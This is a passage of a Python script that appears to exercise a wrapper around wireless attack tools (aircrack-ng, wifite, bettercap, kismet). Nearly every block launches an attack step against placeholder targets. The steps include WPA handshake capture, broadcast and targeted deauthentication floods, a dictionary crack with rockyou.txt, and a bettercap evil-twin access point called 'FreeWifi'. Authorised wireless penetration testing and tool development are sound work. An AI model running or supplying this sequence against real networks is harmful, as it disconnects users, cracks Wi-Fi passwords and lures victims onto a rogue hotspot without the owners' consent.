        mode="ap_scan",
        args=["--band", "abg", "-w", "/tmp/scan"],
    )
    print("=== AP SCAN ===")
    print(json.dumps(r, indent=2))

    # ─────────────────────────────
    # 3. Targeted channel scan
    # ─────────────────────────────
    r = wireless_scan(
        tool="aircrack-ng",
        interface="wlan0mon",
        mode="channel_scan",
        args=["--channel", "6", "--bssid", "AA:BB:CC:DD:EE:FF", "-w", "/tmp/target"],
    )
    print("=== CHANNEL SCAN ===")
    print(json.dumps(r, indent=2))

    # ─────────────────────────────
    # 4. WPA handshake capture
    # ─────────────────────────────
    r = wireless_scan(
        tool="aircrack-ng",
        interface="wlan0mon",
        mode="handshake",
        args=["--bssid", "AA:BB:CC:DD:EE:FF", "--channel", "6", "-w", "/tmp/hs"],
    )
    print("=== HANDSHAKE ===")
    print(json.dumps(r, indent=2))

    # ─────────────────────────────
    # 5. Broadcast deauth
    # ─────────────────────────────
    r = wireless_scan(
        tool="aircrack-ng",
        interface="wlan0mon",
        mode="deauth",
        args=["-a", "AA:BB:CC:DD:EE:FF", "-0", "10"],
    )
    print("=== DEAUTH ===")
    print(json.dumps(r, indent=2))

    # ─────────────────────────────
    # 6. Targeted deauth (single client)
    # ─────────────────────────────
    r = wireless_scan(
        tool="aircrack-ng",
        interface="wlan0mon",
        mode="deauth",
        args=["-a", "AA:BB:CC:DD:EE:FF", "-c", "11:22:33:44:55:66", "-0", "5"],
    )
    print("=== TARGETED DEAUTH ===")
    print(json.dumps(r, indent=2))

    # ─────────────────────────────
    # 7. wifite passive scan
    # ─────────────────────────────
    r = wireless_scan(
        tool="wifite",
        interface="wlan0",
        mode="wifite_scan",
        args=["--kill"],
    )
    print("=== WIFITE SCAN ===")
    print(json.dumps(r, indent=2))

    # ─────────────────────────────
    # 8. wifite automated WPA attack
    # ─────────────────────────────
    r = wireless_scan(
        tool="wifite",
        interface="wlan0",
        mode="wifite_attack",
        args=["--wpa", "--bssid", "AA:BB:CC:DD:EE:FF", "--dict", "/usr/share/wordlists/rockyou.txt"],
    )
    print("=== WIFITE ATTACK ===")
    print(json.dumps(r, indent=2))

    # ─────────────────────────────
    # 9. bettercap wifi recon + rogue AP detection
    # ─────────────────────────────
    r = wireless_scan(
        tool="bettercap",
        interface="wlan0",
        mode="bc_scan",
    )
    print("=== BETTERCAP SCAN ===")
    print(json.dumps(r, indent=2))

    # ─────────────────────────────
    # 10. bettercap deauth
    # ─────────────────────────────
    r = wireless_scan(
        tool="bettercap",
        interface="wlan0",
        mode="bc_deauth",
        args=["-eval", "wifi.deauth AA:BB:CC:DD:EE:FF"],
    )
    print("=== BETTERCAP DEAUTH ===")
    print(json.dumps(r, indent=2))

    # ─────────────────────────────
    # 11. bettercap evil twin / rogue AP
    # ─────────────────────────────
    r = wireless_scan(
        tool="bettercap",
        interface="wlan0",
        mode="bc_ap",
        args=["-eval", "set wifi.ap.ssid FreeWifi; wifi.ap on"],
    )
    print("=== BETTERCAP EVIL TWIN ===")
    print(json.dumps(r, indent=2))

    # ─────────────────────────────
    # 12. kismet passive recon
    # ─────────────────────────────
    r = wireless_scan(
        tool="kismet",
        interface="wlan0",
        mode="kismet_scan",
        args=["-c", "wlan0:channels=1,6,11", "--log-types", "kismet"],
    )
    print("=== KISMET PASSIVE ===")
    print(json.dumps(r, indent=2))

    # ─────────────────────────────
    # 13. Disable monitor mode
    # ─────────────────────────────
    r = wireless_scan(
        tool="aircrack-ng",
        interface="wlan0mon",
        mode="monitor_off",
    )
    print("=== MONITOR OFF ===")
    print(json.dumps(r, indent=2))